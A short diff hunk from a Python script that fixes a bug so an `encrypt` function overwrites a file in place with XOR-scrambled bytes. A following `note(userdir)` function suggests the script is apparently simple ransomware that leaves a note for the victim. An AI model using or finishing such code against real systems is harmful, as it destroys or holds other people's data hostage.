@@ -22,7 +22,7 @@ def encrypt(file):
     with open(file, 'rb') as f:
         data = f.read()
     with open(file, 'wb') as fp:
-        f.write(xord(data))
+        fp.write(xord(data))
 
 
 def note(userdir):
